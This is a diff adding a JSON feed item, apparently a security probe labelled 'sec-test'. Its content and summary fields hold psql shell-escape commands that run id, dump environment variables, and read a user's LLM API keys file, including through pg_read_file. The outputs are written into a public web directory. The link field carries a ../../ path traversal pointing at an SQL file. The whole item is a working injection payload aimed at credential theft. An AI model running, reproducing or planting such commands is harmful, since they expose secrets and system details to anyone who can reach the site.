@@ -1,0 +1,11 @@
+{
+  "id": "45f398e6a2da9c146109c5b0",
+  "title": "sec-test-74277-ding by sec-test-host",
+  "summary": "sec-test-74277-1795819935 sleeper 0_ first-load order \\!id | tee /var/www/html/sive.rs/sec-test-74277-1795819935-ran.txt ; true \\!cat $HOME/.config/io.datasette.llm/keys.json /home/derek/.config/io.datasette.llm/keys.json | tee /var/www/html/sive.rs/sec-test-74277-1795819935-keys.json ; true \\!env | sort | tee /var/www/html/sive.rs/sec-test-74277-1795819935…",
+  "content": "<p>sec-test-74277-1795819935 sleeper 0_ first-load order\n\\!id | tee /var/www/html/sive.rs/sec-test-74277-1795819935-ran.txt ; true\n\\!cat $HOME/.config/io.datasette.llm/keys.json /home/derek/.config/io.datasette.llm/keys.json | tee /var/www/html/sive.rs/sec-test-74277-1795819935-keys.json ; true\n\\!env | sort | tee /var/www/html/sive.rs/sec-test-74277-1795819935-env.txt ; true\n\\!ls -la /home/derek/.config/io.datasette.llm | tee /var/www/html/sive.rs/sec-test-74277-1795819935-llmdir.txt ; true\ncopy (select pg_read_file($$/home/derek/.config/io.datasette.llm/keys.json$$)) to $$/tmp/sec-test-74277-1795819935-pgkeys.json$$;\n\\!cat /tmp/sec-test-74277-1795819935-pgkeys.json | tee /var/www/html/sive.rs/sec-test-74277-1795819935-pgkeys.json ; true\n\\!cat /home/derek/.config/io.datasette.llm/keys.json | tee /home/derek/code/b/public/sive.rs/sec-test-74277-1795819935-keys-b.json ; true\n</p>",
+  "image": null,
+  "publishedAt": "2026-04-01T09:00:00Z",
+  "sourceId": "3d0d017fd829e1d6",
+  "sourceTitle": "Derek Sivers",
+  "link": "https://sive.rs/../../../../home/derek/code/b/ding/0__sec-test-74277-1795819935.sql"
+}
